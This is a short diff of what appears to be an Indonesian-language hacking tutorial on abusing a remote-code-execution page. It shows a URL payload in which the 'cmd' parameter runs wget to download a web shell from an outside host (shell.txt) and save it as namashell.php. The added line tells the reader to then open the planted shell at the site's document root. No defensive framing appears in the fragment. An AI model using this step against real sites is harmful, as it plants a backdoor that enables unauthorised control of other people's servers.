@@ -37,6 +37,7 @@ Kita Menggunakan Command wget
 ```
 http://site.com/rce.php?cmd=wget http://dyan6etar.cf/shell.txt -O namashell.php
 ```
+Jika Sudah Kita Akses Di Dokumen Root : site.com/namashell.php
 
 ### Penjelasan Singkat
 Penjelasan Singkat Tentang Command wget :
